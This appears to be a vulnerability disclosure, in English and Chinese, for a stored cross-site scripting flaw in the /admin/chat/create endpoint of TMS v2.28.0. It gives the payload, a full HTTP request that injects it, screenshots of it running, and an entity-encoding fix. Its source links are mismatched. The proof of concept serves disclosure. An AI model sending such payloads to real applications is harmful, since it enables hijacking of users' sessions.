# TMS v2.28.0 /admin/chat/create interface Cross-Site Scripting (XSS) vulnerability
>Source code repository：[https://gitee.com/ketr/jepaas-release](https://github.com/xiweicheng/tms)
>
>Affected version: v2.28.0
>
>Official website：[https://jepaas.com/download](https://gitee.com/xiweicheng/tms)
>
>releases：[https://example.jepaas.com/login.html
](https://github.com/xiweicheng/tms/releases/tag/v2.28.0)

## 1、分析（analysis）

The `/admin/chat/create` endpoint fails to validate input parameters and stores them directly in the database, resulting in a Cross-Site Scripting (XSS) vulnerability.

/admin/chat/create接口未对传入的参数进行校验,直接存入数据库,导致存在XSS问题;

src\main\java\com\lhjz\portal\controller\ChatController.java

<img width="1032" height="828" alt="Pasted image 20251203161331" src="https://github.com/user-attachments/assets/72ac05fe-c40c-4777-b3be-4cd767dbf868" />


## 2、复现（replicate）

Injected payload: `<img src onerror=alert(1111)>`

插入payload `<img src onerror=alert(1111)>`

<img width="2240" height="984" alt="Pasted image 20251203160948" src="https://github.com/user-attachments/assets/241aedcf-0f14-4eef-b098-e0ba56e205e9" />


The JavaScript code was executed.

js代码被执行
<img width="1329" height="846" alt="Pasted image 20251203160910" src="https://github.com/user-attachments/assets/58b3c9de-9211-4416-80a9-35ba6d45315c" />



``` http
POST /admin/chat/create HTTP/1.1
Host: 192.168.0.62:8090
Content-Length: 7018
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.62:8090
Referer: http://192.168.0.62:8090/admin/dynamic
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive

content=<img src onerror=alert(1111)>&preMore=false&lastId=-1&baseURL=http%3A%2F%2F192.168.0.62%3A8090%2F&usernames=&groups=&contentHtml=%3Cdiv+class%3D%22markdown-body%22%3E%3Cstyle%3E.markdown-body%7Bfont-size%3A14px%3Bline-height%3A1.6%7D.markdown-body%3E%3Afirst-child%7Bmargin-top%3A0!important%7D.markdown-body%3E%3Alast-child%7Bmargin-bottom%3A0!important%7D.markdown-body+a.absent%7Bcolor%3A%23C00%7D.markdown-body+a.anchor%7Bbottom%3A0%3Bcursor%3Apointer%3Bdisplay%3Ablock%3Bleft%3A0%3Bmargin-left%3A-30px%3Bpadding-left%3A30px%3Bposition%3Aabsolute%3Btop%3A0%7D.markdown-body+h1%2C.markdown-body+h2%2C.markdown-body+h3%2C.markdown-body+h4%2C.markdown-body+h5%2C.markdown-body+h6%7Bcursor%3Atext%3Bfont-weight%3A700%3Bmargin%3A20px+0+10px%3Bpadding%3A0%3Bposition%3Arelative%7D.markdown-body+h1+.mini-icon-link%2C.markdown-body+h2+.mini-icon-link%2C.markdown-body+h3+.mini-icon-link%2C.markdown-body+h4+.mini-icon-link%2C.markdown-body+h5+.mini-icon-link%2C.markdown-body+h6+.mini-icon-link%7Bcolor%3A%23000%3Bdisplay%3Anone%7D.markdown-body+h1%3Ahover+a.anchor%2C.markdown-body+h2%3Ahover+a.anchor%2C.markdown-body+h3%3Ahover+a.anchor%2C.markdown-body+h4%3Ahover+a.anchor%2C.markdown-body+h5%3Ahover+a.anchor%2C.markdown-body+h6%3Ahover+a.anchor%7Bline-height%3A1%3Bmargin-left%3A-22px%3Bpadding-left%3A0%3Btext-decoration%3Anone%3Btop%3A15%25%7D.markdown-body+h1%3Ahover+a.anchor+.mini-icon-link%2C.markdown-body+h2%3Ahover+a.anchor+.mini-icon-link%2C.markdown-body+h3%3Ahover+a.anchor+.mini-icon-link%2C.markdown-body+h4%3Ahover+a.anchor+.mini-icon-link%2C.markdown-body+h5%3Ahover+a.anchor+.mini-icon-link%2C.markdown-body+h6%3Ahover+a.anchor+.mini-icon-link%7Bdisplay%3Ainline-block%7D.markdown-body+hr%3Aafter%2C.markdown-body+hr%3Abefore%7Bdisplay%3Atable%3Bcontent%3A%22%22%7D.markdown-body+h1+code%2C.markdown-body+h1+tt%2C.markdown-body+h2+code%2C.markdown-body+h2+tt%2C.markdown-body+h3+code%2C.markdown-body+h3+tt%2C.markdown-body+h4+code%2C.markdown-body+h4+tt%2C.markdown-body+h5+code%2C.markdown-body+h5+tt%2C.markdown-body+h6+code%2C.markdown-body+h6+tt%7Bfont-size%3Ainherit%7D.markdown-body+h1%7Bcolor%3A%23000%3Bfont-size%3A28px%7D.markdown-body+h2%7Bborder-bottom%3A1px+solid+%23CCC%3Bcolor%3A%23000%3Bfont-size%3A24px%7D.markdown-body+h3%7Bfont-size%3A18px%7D.markdown-body+h4%7Bfont-size%3A16px%7D.markdown-body+h5%7Bfont-size%3A14px%7D.markdown-body+h6%7Bcolor%3A%23777%3Bfont-size%3A14px%7D.markdown-body+blockquote%2C.markdown-body+dl%2C.markdown-body+ol%2C.markdown-body+p%2C.markdown-body+pre%2C.markdown-body+table%2C.markdown-body+ul%7Bmargin%3A15px+0%7D.markdown-body+hr%7Boverflow%3Ahidden%3Bbackground%3A%23e7e7e7%3Bheight%3A4px%3Bpadding%3A0%3Bmargin%3A16px+0%3Bborder%3A0%3B-moz-box-sizing%3Acontent-box%3Bbox-sizing%3Acontent-box%7D.markdown-body+h1%2Bp%2C.markdown-body+h2%2Bp%2C.markdown-body+h3%2Bp%2C.markdown-body+h4%2Bp%2C.markdown-body+h5%2Bp%2C.markdown-body+h6%2Bp%2C.markdown-body+ol+li%3E%3Afirst-child%2C.markdown-body+ul+li%3E%3Afirst-child%7Bmargin-top%3A0%7D.markdown-body+hr%3Aafter%7Bclear%3Aboth%7D.markdown-body+a%3Afirst-child+h1%2C.markdown-body+a%3Afirst-child+h2%2C.markdown-body+a%3Afirst-child+h3%2C.markdown-body+a%3Afirst-child+h4%2C.markdown-body+a%3Afirst-child+h5%2C.markdown-body+a%3Afirst-child+h6%2C.markdown-body%3Eh1%3Afirst-child%2C.markdown-body%3Eh1%3Afirst-child%2Bh2%2C.markdown-body%3Eh2%3Afirst-child%2C.markdown-body%3Eh3%3Afirst-child%2C.markdown-body%3Eh4%3Afirst-child%2C.markdown-body%3Eh5%3Afirst-child%2C.markdown-body%3Eh6%3Afirst-child%7Bmargin-top%3A0%3Bpadding-top%3A0%7D.markdown-body+li+p.first%7Bdisplay%3Ainline-block%7D.markdown-body+ol%2C.markdown-body+ul%7Bpadding-left%3A30px%7D.markdown-body+ol.no-list%2C.markdown-body+ul.no-list%7Blist-style-type%3Anone%3Bpadding%3A0%7D.markdown-body+ol+ol%2C.markdown-body+ol+ul%2C.markdown-body+ul+ol%2C.markdown-body+ul+ul%7Bmargin-bottom%3A0%7D.markdown-body+dl%7Bpadding%3A0%7D.markdown-body+dl+dt%7Bfont-size%3A14px%3Bfont-style%3Aitalic%3Bfont-weight%3A700%3Bmargin%3A15px+0+5px%3Bpadding%3A0%7D.markdown-body+dl+dt%3Afirst-child%7Bpadding%3A0%7D.markdown-body+dl+dt%3E%3Afirst-child%7Bmargin-top%3A0%7D.markdown-body+dl+dt%3E%3Alast-child%7Bmargin-bottom%3A0%7D.markdown-body+dl+dd%7Bmargin%3A0+0+15px%3Bpadding%3A0+15px%7D.markdown-body+blockquote%3E%3Afirst-child%2C.markdown-body+dl+dd%3E%3Afirst-child%7Bmargin-top%3A0%7D.markdown-body+blockquote%3E%3Alast-child%2C.markdown-body+dl+dd%3E%3Alast-child%7Bmargin-bottom%3A0%7D.markdown-body+blockquote%7Bborder-left%3A4px+solid+%23DDD%3Bcolor%3A%23777%3Bpadding%3A0+15px%7D.markdown-body+table+th%7Bfont-weight%3A700%7D.markdown-body+table+td%2C.markdown-body+table+th%7Bborder%3A1px+solid+%23CCC%3Bpadding%3A6px+13px%7D.markdown-body+table+tr%7Bbackground-color%3A%23FFF%3Bborder-top%3A1px+solid+%23CCC%7D.markdown-body+table+tr%3Anth-child(2n)%7Bbackground-color%3A%23F8F8F8%7D.markdown-body+img%7Bmax-width%3A100%25%7D.markdown-body+span.frame%7Bdisplay%3Ablock%3Boverflow%3Ahidden%7D.markdown-body+span.frame%3Espan%7Bborder%3A1px+solid+%23DDD%3Bdisplay%3Ablock%3Bfloat%3Aleft%3Bmargin%3A13px+0+0%3Boverflow%3Ahidden%3Bpadding%3A7px%3Bwidth%3Aauto%7D.markdown-body+span.frame+span+img%7Bdisplay%3Ablock%3Bfloat%3Aleft%7D.markdown-body+span.frame+span+span%7Bclear%3Aboth%3Bcolor%3A%23333%3Bdisplay%3Ablock%3Bpadding%3A5px+0+0%7D.markdown-body+span.align-center%7Bclear%3Aboth%3Bdisplay%3Ablock%3Boverflow%3Ahidden%7D.markdown-body+span.align-center%3Espan%7Bdisplay%3Ablock%3Bmargin%3A13px+auto+0%3Boverflow%3Ahidden%3Btext-align%3Acenter%7D.markdown-body+span.align-center+span+img%7Bmargin%3A0+auto%3Btext-align%3Acenter%7D.markdown-body+span.align-right%7Bclear%3Aboth%3Bdisplay%3Ablock%3Boverflow%3Ahidden%7D.markdown-body+span.align-right%3Espan%7Bdisplay%3Ablock%3Bmargin%3A13px+0+0%3Boverflow%3Ahidden%3Btext-align%3Aright%7D.markdown-body+span.align-right+span+img%7Bmargin%3A0%3Btext-align%3Aright%7D.markdown-body+span.float-left%7Bdisplay%3Ablock%3Bfloat%3Aleft%3Bmargin-right%3A13px%3Boverflow%3Ahidden%7D.markdown-body+span.float-left+span%7Bmargin%3A13px+0+0%7D.markdown-body+span.float-right%7Bdisplay%3Ablock%3Bfloat%3Aright%3Bmargin-left%3A13px%3Boverflow%3Ahidden%7D.markdown-body+span.float-right%3Espan%7Bdisplay%3Ablock%3Bmargin%3A13px+auto+0%3Boverflow%3Ahidden%3Btext-align%3Aright%7D.markdown-body+code%2C.markdown-body+tt%7Bbackground-color%3A%23F8F8F8%3Bborder%3A1px+solid+%23EAEAEA%3Bborder-radius%3A3px%3Bmargin%3A0+2px%3Bpadding%3A0+5px%3Bwhite-space%3Anowrap%7D.markdown-body+pre%3Ecode%7Bbackground%3Anone%3Bborder%3Anone%3Bmargin%3A0%3Bpadding%3A0%3Bwhite-space%3Apre%7D.markdown-body+.highlight+pre%2C.markdown-body+pre%7Bbackground-color%3A%23F8F8F8%3Bborder%3A1px+solid+%23CCC%3Bborder-radius%3A3px%3Bfont-size%3A13px%3Bline-height%3A19px%3Boverflow%3Aauto%3Bpadding%3A6px+10px%7D.markdown-body+pre+code%2C.markdown-body+pre+tt%7Bbackground-color%3Atransparent%3Bborder%3Anone%7D%3C%2Fstyle%3E%3Cp%3E%3Cimg+src%3D%22%22+onerror%3D%22alert(1111)%22%3E%3C%2Fp%3E%0A%3C%2Fdiv%3E&=

```

## 3、修复方案（remediation plan）

Apply entity encoding (or HTML entity encoding) to parameters received from users.

对从用户处接收到的参数,使用是实体化编码

